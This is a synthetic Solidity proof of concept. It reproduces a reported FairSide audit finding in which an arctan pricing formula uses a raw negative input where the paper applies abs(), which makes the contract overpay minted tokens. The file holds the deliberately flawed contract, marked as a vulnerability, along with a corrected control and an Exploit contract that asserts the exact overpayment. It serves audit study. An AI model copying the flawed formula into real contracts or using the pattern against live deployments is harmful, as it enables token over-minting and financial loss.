// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  FairSide — FairSideFormula._arctan drops abs on a negative input
    (Code4rena H-08, AuditVault 42204). SYNTHETIC, cheatcode-free.

    The paper form is
        a * pi/4 - a * (abs(a) - 1) * (APPROX_A + APPROX_B * abs(a))
    The contract uses raw a in both places. arcs passes a = 1 - arcInner.
    When the capital pool makes arcInner > 1, a is negative and the FSD
    payout changes.

    For capital = 1e18, MULTIPLIER = 3e18, fS3_4 = 2e18:
        arcInner = 1.5e18, a = -0.5e18
        buggy payout 551361581698724154
        fair payout  462161581698724154
        overpay       89200000000000000

    The control uses the report's abs form and pays the fair amount. */

contract Fsd {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract FairSideFormula {
    int256 internal constant W = 1e18;
    int256 internal constant ONE = 1e18;
    int256 internal constant PI_4 = 785398163397448309;
    int256 internal constant APPROX_A = 244700000000000000;
    int256 internal constant APPROX_B = 66300000000000000;
    int256 internal constant MULTIPLIER = 3e18;
    int256 internal constant FS34 = 2e18;

    Fsd public fsd;

    constructor(Fsd _fsd) {
        fsd = _fsd;
    }

    function mul(int256 x, int256 y) internal pure returns (int256) {
        return x * y / W;
    }

    function _arctan(int256 a) internal pure returns (int256) {
        int256 linear = mul(a, PI_4);
        // @> VULN: (a - ONE) and APPROX_B * a use raw a; the paper uses abs(a), and this a is negative
        int256 wrong = mul(mul(a, a - ONE), APPROX_A + mul(APPROX_B, a));
        return linear - wrong;
    }

    function _arctanFair(int256 a) internal pure returns (int256) {
        int256 aa = a < 0 ? -a : a;
        int256 linear = mul(a, PI_4);
        int256 corr = mul(mul(a, aa - ONE), APPROX_A + mul(APPROX_B, aa));
        return linear - corr;
    }

    function _a(int256 capital) internal pure returns (int256) {
        int256 arcInner = MULTIPLIER * capital / FS34;
        return ONE - arcInner;
    }

    function calculateDeltaOfFSD(int256 capital) public pure returns (int256) {
        return _arctan(_a(capital));
    }

    function fairDelta(int256 capital) public pure returns (int256) {
        return _arctanFair(_a(capital));
    }

    function buy(int256 capital) external returns (uint256 paid) {
        int256 arcInner = MULTIPLIER * capital / FS34;
        int256 a = ONE - arcInner;
        int256 delta = _arctan(a);
        paid = uint256(delta < 0 ? -delta : delta);
        fsd.mint(msg.sender, paid);
    }
}

contract Exploit {
    Fsd public fsd; // nonce 1
    FairSideFormula public curve; // nonce 2

    constructor() {
        fsd = new Fsd();
        curve = new FairSideFormula(fsd);
    }

    function run() external {
        int256 capital = 1 ether;
        curve.buy(capital);
        uint256 paid = fsd.balanceOf(address(this));
        int256 fairSigned = curve.fairDelta(capital);
        uint256 fairPay = uint256(fairSigned < 0 ? -fairSigned : fairSigned);
        int256 a = curve.calculateDeltaOfFSD(capital);
        require(a < 0, "a path is negative");
        require(paid == 551361581698724154, "paid");
        require(fairPay == 462161581698724154, "fair");
        require(paid - fairPay == 89200000000000000, "overpay");
        require(fsd.totalSupply() == paid, "minted the buggy amount");
    }
}
